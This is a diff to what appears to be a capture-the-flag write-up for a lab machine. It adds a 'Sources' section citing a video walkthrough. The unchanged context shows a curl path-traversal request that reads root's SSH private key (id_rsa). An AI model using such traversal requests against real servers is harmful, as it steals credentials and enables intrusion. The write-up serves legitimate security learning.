@@ -141,3 +141,7 @@ The payload would be
 `curl -s --path-as-is http://localhost:8080/assets/../../../root/.ssh/id_rsa`
 
 And we can get the id_rsa of root.
+
+## Fuentes / Sources
+
+- [IppSec: Chemistry (video)](https://youtube.com/watch?v=OH00LkpHyLk) - IppSec - fecha de acceso: 2026-09-24.
